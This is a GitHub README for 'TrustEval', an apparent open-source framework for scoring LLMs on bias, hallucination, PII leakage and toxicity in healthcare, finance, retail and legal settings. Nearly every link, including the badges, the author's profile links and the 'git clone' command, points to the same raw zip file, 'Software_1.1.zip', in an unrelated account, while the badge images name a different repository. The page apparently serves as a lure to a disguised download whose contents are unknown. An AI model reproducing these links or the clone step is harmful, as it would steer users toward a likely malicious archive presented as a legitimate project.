<p align="center">
  <img src="assets/logo.svg" alt="TrustEval — Enterprise LLM Evaluation Framework" width="140" height="140">
</p>

<h1 align="center">TrustEval</h1>
<p align="center"><strong>Benchmark LLMs. Build Trust. Ship Responsibly.</strong></p>
<p align="center">The open-source framework for evaluating LLM safety, fairness, and reliability in regulated industries.</p>

<p align="center">
  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/pypi/v/trusteval-ai?color=6366F1&style=for-the-badge&logo=pypi&logoColor=white" alt="PyPI Version"></a>
  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/pypi/pyversions/trusteval-ai?color=3776AB&style=for-the-badge&logo=python&logoColor=white" alt="Python 3.10 | 3.11 | 3.12"></a>
  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/badge/license-MIT-10B981?style=for-the-badge" alt="MIT License"></a>
  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/github/actions/workflow/status/antrixsh/trusteval/ci.yml?style=for-the-badge&logo=githubactions&logoColor=white&label=CI" alt="CI Status"></a>
</p>

<p align="center">
  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/github/stars/antrixsh/trusteval?style=for-the-badge&logo=github&color=yellow" alt="GitHub Stars"></a>
  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/github/forks/antrixsh/trusteval?style=for-the-badge&logo=github&color=blue" alt="GitHub Forks"></a>
  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/github/issues/antrixsh/trusteval?style=for-the-badge&logo=github&color=orange" alt="Open Issues"></a>
  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/badge/downloads-new-6366F1?style=for-the-badge&logo=pypi&logoColor=white" alt="PyPI Downloads"></a>
</p>

<p align="center">
  <a href="#-quick-start">Quick Start</a> •
  <a href="#-features">Features</a> •
  <a href="#-supported-industries">Industries</a> •
  <a href="#-evaluation-pillars">Pillars</a> •
  <a href="#-providers">Providers</a> •
  <a href="#-documentation">Docs</a> •
  <a href="#-contributing">Contributing</a>
</p>

---

## Why TrustEval?

Deploying LLMs in regulated industries like **Healthcare**, **Banking**, **Retail**, and **Legal** is risky without proper evaluation. Off-the-shelf benchmarks don't cover domain-specific compliance, bias, or safety requirements.

**TrustEval** is a production-ready Python framework that provides:

- **Industry-specific benchmarks** — 600+ test prompts aligned to real regulations (HIPAA, GDPR, PCI-DSS, ABA Rules)
- **4 Responsible AI pillars** — Bias & Fairness, Hallucination Detection, PII/Data Leakage, Toxicity & Safety
- **Multi-provider support** — Evaluate OpenAI, Anthropic, Google Gemini, and HuggingFace models side-by-side
- **Enterprise-grade security** — Encrypted API key storage, audit logging, input sanitization, rate limiting
- **3 interfaces** — Python SDK, CLI tool, and Web Dashboard
- **Compliance-ready reports** — PDF, JSON, CSV, and HTML — built for audit teams

> *"Don't just deploy AI. Trust it."*

---

## ✨ Features

<table>
<tr>
<td width="50%">

### 🛡️ 4 AI Safety Pillars
Evaluate hallucination, bias, PII leakage, and toxicity with weighted scoring and automated grading (A–F).

### 🏥 4 Industry Modules
Healthcare (HIPAA), BFSI (GDPR/PCI-DSS), Retail (FTC), Legal (ABA) — each with 150+ domain-specific prompts.

### 🔗 4 LLM Providers
OpenAI GPT-4, Anthropic Claude, Google Gemini, HuggingFace — test any model with one API.

</td>
<td width="50%">

### 📊 Web Dashboard
Real-time evaluation results, model comparison, and trend analysis with React + Tailwind + Recharts.

### 📋 Compliance Reports
Generate audit-ready PDF, JSON, CSV, and HTML reports with per-pillar breakdowns and regulatory citations.

### 🔐 Enterprise Security
Fernet-encrypted key storage, SHA256 hash-chain audit logs, prompt injection detection, token bucket rate limiting.

</td>
</tr>
</table>

---

## 🚀 Quick Start

### Installation

```bash
pip install trusteval-ai
```

### Python SDK

```python
from trusteval import TrustEvaluator

evaluator = TrustEvaluator(
    provider="openai",
    model="gpt-4o",
    industry="healthcare"
)

result = evaluator.evaluate()
print(result.summary())

# Export compliance report
result.export("audit_report.pdf")
result.export("audit_data.json", format="json")
```

### CLI

```bash
# Run a full evaluation
trusteval evaluate --provider openai --model gpt-4o --industry healthcare -o results.json

# Compare two models
trusteval compare --providers openai,anthropic --models gpt-4o,claude-3-opus-20240229

# Generate a report
trusteval report generate -i results.json -f html -o report.html
```

### Web Dashboard

```bash
# Start the dashboard server
trusteval dashboard start

# Open http://localhost:8080 in your browser
```

---

## 🏭 Supported Industries

| Industry | Benchmark Areas | Regulations | Prompts |
|----------|----------------|-------------|---------|
| **🏥 Healthcare** | Clinical QA, Triage, ICD Coding, PHI Leakage, Drug Interactions | HIPAA, FDA, Clinical Guidelines | 155+ |
| **🏦 BFSI** | Credit Fairness, Fraud Detection, KYC/AML, Risk Assessment | GDPR, PCI-DSS, SOX, Basel III | 156+ |
| **🛒 Retail** | Recommendations, Customer Service, Pricing, Consumer PII | FTC Act, CCPA, Consumer Protection | 156+ |
| **⚖️ Legal** | Contract Analysis, Legal Advice, Privilege, Jurisdictional Awareness | ABA Model Rules, UPL Statutes | 156+ |

Each industry module includes:
- Domain-specific test prompts mapped to trust pillars
- Regulatory compliance checks with pass/fail results
- Industry-specific scoring and grading criteria

---

## 📐 Evaluation Pillars

TrustEval evaluates every LLM response across four Responsible AI dimensions:

| Pillar | Weight | What It Measures | Key Metrics |
|--------|--------|------------------|-------------|
| **🔍 Hallucination** | 30% | Factual accuracy and reliability | F1 word-overlap, source grounding, confidence calibration, consistency |
| **⚖️ Bias & Fairness** | 25% | Equitable treatment across demographics | Demographic parity, counterfactual consistency, stereotype density |
| **🔒 PII Detection** | 25% | Data leakage and privacy protection | 20 PII pattern types, Luhn validation, PII echo detection |
| **🛡️ Toxicity** | 20% | Harmful and unsafe content | Hate speech, profanity, violence scoring, jailbreak resistance |

### Scoring & Grading

| Grade | Score Range | Trust Level | Meaning |
|-------|-----------|-------------|---------|
| **A** | 0.85 – 1.00 | ✅ TRUSTED | Safe for production deployment |
| **B** | 0.70 – 0.84 | ✅ TRUSTED | Safe with monitoring |
| **C** | 0.55 – 0.69 | ⚠️ CONDITIONAL | Requires human oversight |
| **D** | 0.40 – 0.54 | ⚠️ CONDITIONAL | Significant concerns |
| **F** | 0.00 – 0.39 | ❌ UNTRUSTED | Not recommended for deployment |

---

## 🔗 Providers

| Provider | Models | Features |
|----------|--------|----------|
| **OpenAI** | GPT-4, GPT-4 Turbo, GPT-4o, GPT-3.5 Turbo | Sync & async, token counting, cost estimation |
| **Anthropic** | Claude 3 Opus, Sonnet, Haiku, Claude 2.1 | Message format handling, system prompts |
| **Google Gemini** | Gemini Pro, Gemini 1.5 Pro, Gemini 1.5 Flash | Content generation, safety settings |
| **HuggingFace** | Any model via Inference API or local | Auto-detect local vs. Hub, pipeline support |

### Provider Configuration

```bash
# Set API keys via environment variables
export OPENAI_API_KEY="sk-..."
export ANTHROPIC_API_KEY="sk-ant-..."
export GOOGLE_API_KEY="..."
export HUGGINGFACE_API_KEY="hf_..."

# Or use TrustEval's encrypted key manager
trusteval providers configure --provider openai

# Test connectivity
trusteval providers test --provider openai

# List all supported providers and models
trusteval providers list
```

---

## 🏗️ Architecture

```
trusteval/
├── core/                  # Evaluation engine, scoring, pipeline orchestration
│   ├── evaluator.py       # Main TrustEvaluator class
│   ├── scorer.py          # Weighted scoring, grading (A-F), trust levels
│   ├── pipeline.py        # Sequential & parallel evaluation pipelines
│   ├── result.py          # EvaluationResult with export capabilities
│   └── benchmark.py       # BenchmarkSuite ABC with TestCase/TestResult
├── pillars/               # Responsible AI detection modules
│   ├── bias/              # BiasDetector, stereotype matching, demographic parity
│   ├── hallucination/     # Factual accuracy (F1), confidence calibration
│   ├── pii/               # 20 PII regex patterns, Luhn validation
│   └── toxicity/          # Hate speech, violence, profanity, jailbreak detection
├── providers/             # LLM provider connectors with retry logic
│   ├── openai_provider.py
│   ├── anthropic_provider.py
│   ├── gemini_provider.py
│   └── huggingface_provider.py
├── industries/            # Domain-specific benchmark suites
│   ├── healthcare/        # HIPAA compliance, PHI detection, clinical QA
│   ├── bfsi/              # GDPR, PCI-DSS, credit fairness, fraud detection
│   ├── retail/            # FTC compliance, consumer PII, pricing fairness
│   └── legal/             # ABA rules, privilege detection, jurisdictional awareness
├── security/              # Enterprise security module
│   ├── encryption.py      # PBKDF2 + Fernet symmetric encryption
│   ├── key_manager.py     # Encrypted API key storage (~/.trusteval/keys.enc)
│   ├── audit_logger.py    # SHA256 hash-chain tamper-evident logging
│   ├── input_sanitizer.py # 23 injection patterns, prompt length limits
│   └── rate_limiter.py    # Token bucket algorithm (60 RPM default)
├── reporters/             # Report generation (PDF, JSON, CSV, HTML)
└── utils/                 # Validators, helpers, constants

cli/                       # Click + Rich CLI tool
dashboard/
├── backend/               # FastAPI + async SQLAlchemy + WebSocket
└── frontend/              # React 18 + Vite + Tailwind CSS + Recharts

tests/
├── unit/                  # 157 unit tests
└── integration/           # 34 integration tests
```

---

## 📊 Full Example — Healthcare Evaluation

```python
from trusteval import TrustEvaluator

# Configure evaluator for healthcare
evaluator = TrustEvaluator(
    provider="openai",
    model="gpt-4o",
    industry="healthcare",
    pillars=["bias", "hallucination", "pii", "toxicity"],
    verbose=True
)

# Run full evaluation
result = evaluator.evaluate()

# Check results
print(f"Overall Score: {result.overall_score:.2f}")
print(f"Overall Grade: {result.overall_grade}")
print(f"Trust Level:   {result.trust_level}")

# Per-pillar breakdown
for pillar_name, pillar in result.pillars.items():
    print(f"  {pillar_name}: {pillar.score:.2f} ({pillar.grade})"
          f" - {pillar.pass_count}/{pillar.test_count} passed")

# Export compliance report
result.export("healthcare_gpt4o_audit.pdf")
result.export("healthcare_gpt4o_data.json", format="json")
result.export("healthcare_gpt4o_report.html", format="html")
```

### Compare Models Side-by-Side

```python
evaluator_gpt = TrustEvaluator(provider="openai", model="gpt-4o", industry="healthcare")
evaluator_claude = TrustEvaluator(provider="anthropic", model="claude-3-opus-20240229", industry="healthcare")

comparison = evaluator_gpt.compare(evaluator_claude)
print(f"Winner: {comparison['winner']}")
print(f"GPT-4o Score:  {comparison['results'][0]['overall_score']:.2f}")
print(f"Claude Score:  {comparison['results'][1]['overall_score']:.2f}")
```

---

## 🔐 Security

TrustEval is built with enterprise security requirements in mind:

| Feature | Implementation |
|---------|---------------|
| **API Key Encryption** | Fernet symmetric encryption with PBKDF2-HMAC-SHA256 key derivation |
| **Audit Logging** | SHA256 hash-chain with daily rotation (30-day retention) |
| **Input Sanitization** | 23 compiled injection patterns, 8000-char prompt limit |
| **Rate Limiting** | Token bucket algorithm, configurable RPM (default: 60) |
| **Prompt Injection Detection** | Pattern matching for DAN mode, jailbreaks, instruction overrides |
| **CORS Protection** | Configurable allowed origins for dashboard API |

```python
from trusteval.security import KeyManager, InputSanitizer, AuditLogger

# Secure key storage
km = KeyManager()
km.store_key("openai", "sk-...")
key = km.get_key("openai")

# Input validation
sanitizer = InputSanitizer()
is_safe, cleaned = sanitizer.validate_prompt(user_input)

# Tamper-evident audit trail
logger = AuditLogger()
logger.log("evaluation_started", {"model": "gpt-4o", "industry": "healthcare"})
```

---

## 🧪 Testing

TrustEval ships with **191 tests** covering all modules:

```bash
# Run all tests
pytest tests/ -v

# Unit tests only
pytest tests/unit/ -v

# Integration tests only
pytest tests/integration/ -v

# With coverage
pytest tests/ --cov=trusteval --cov-report=html -v
```

| Test Suite | Tests | Coverage |
|------------|-------|----------|
| Bias Detector | 22 | Stereotypes, counterfactual, demographic parity, gendered language |
| Hallucination Detector | 20 | Factual accuracy, hallucination rate, confidence, consistency |
| PII Detector | 23 | SSN, credit card, email, phone, IBAN, medical ID, IP address |
| Toxicity Detector | 20 | Hate speech, profanity, violence, jailbreak, category scoring |
| Evaluator | 12 | Init, pillar evaluation, comparison, error handling |
| Scorer | 22 | Grading, trust levels, weighted averages, edge cases |
| Security | 38 | Encryption, key management, sanitization, audit, rate limiting |
| OpenAI Provider | 9 | Generate, batch, rate limits, validation, cost estimation |
| Healthcare Benchmark | 17 | Prompts, compliance checks, coverage |
| Full Pipeline | 8 | End-to-end evaluation, export, comparison |

---

## ⚙️ Configuration

### Environment Variables

```bash
# LLM Provider API Keys
export OPENAI_API_KEY="sk-..."
export ANTHROPIC_API_KEY="sk-ant-..."
export GOOGLE_API_KEY="..."
export HUGGINGFACE_API_KEY="hf_..."

# Dashboard
export TRUSTEVAL_DASHBOARD_KEY="your-secret-key"
export TRUSTEVAL_ALLOWED_ORIGINS="http://localhost:5173"
```

### Config File (~/.trusteval/config.yaml)

```yaml
version: "1.0"
default_industry: healthcare
default_pillars:
  - bias
  - hallucination
  - pii
  - toxicity
evaluation:
  timeout_seconds: 30
  max_test_count: 100
```

---

## 📖 Documentation

| Document | Description |
|----------|-------------|
| [Quick Start Guide](docs/quickstart.md) | Get up and running in 5 minutes |
| [SDK Reference](docs/sdk-reference.md) | Complete Python API documentation |
| [CLI Reference](docs/cli-reference.md) | All CLI commands and options |
| [Security Guide](docs/security.md) | Security architecture and best practices |
| [Industry Guides](docs/industries/) | Per-industry benchmark documentation |
| [Pillar Guides](docs/pillars/) | Deep-dive into each evaluation pillar |
| [Contributing](CONTRIBUTING.md) | How to contribute to TrustEval |
| [Changelog](CHANGELOG.md) | Version history and release notes |

---

## 🗺️ Roadmap

- [ ] **v1.1** — ML-based toxicity and bias detection (transformer models)
- [ ] **v1.2** — Additional industries (Manufacturing, Education, Government)
- [ ] **v1.3** — LLM-as-judge evaluation mode
- [ ] **v1.4** — Continuous monitoring and alerting
- [ ] **v2.0** — Multi-language support, EU AI Act compliance module

---

## 🤝 Contributing

We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

```bash
# Clone and setup
git clone https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip
cd trusteval
python -m venv .venv
source .venv/bin/activate  # Windows: .venv\Scripts\activate
pip install -e ".[dev]"

# Run tests
pytest tests/ -v

# Lint
ruff check trusteval/
```

---

## 👤 Author

<table>
<tr>
<td>

**Antrixsh Gupta**

Enterprise AI & Data Science Leader | LinkedIn Top Voice in AI & Data Science

Senior Manager, Data & AI Practice @ Genzeon

- [LinkedIn](https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip)
- [GitHub](https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip)

</td>
</tr>
</table>

> TrustEval was built to solve a real problem in enterprise AI: there was no single, industry-specific framework to evaluate whether an LLM is truly safe and reliable for regulated industries like Healthcare, BFSI, Retail, and Legal.

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

## ⭐ Star History

If TrustEval helps your team deploy LLMs responsibly, please consider giving it a star!

<p align="center">
  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip">
    <img src="https://img.shields.io/github/stars/antrixsh/trusteval?style=social" alt="GitHub Stars">
  </a>
</p>

<p align="center"><em>"Don't just deploy AI. Trust it."</em></p>

---

<p align="center">
  <strong>Keywords:</strong> LLM evaluation framework, responsible AI, AI safety, bias detection, hallucination detection, PII detection, toxicity detection, healthcare AI, BFSI AI, legal AI compliance, HIPAA AI evaluation, GDPR AI compliance, enterprise LLM benchmarking, AI fairness, LLM auditing, OpenAI evaluation, Claude evaluation, Gemini evaluation, HuggingFace evaluation, AI trust scoring, responsible AI framework, LLM safety testing, AI bias testing, AI compliance automation
</p>
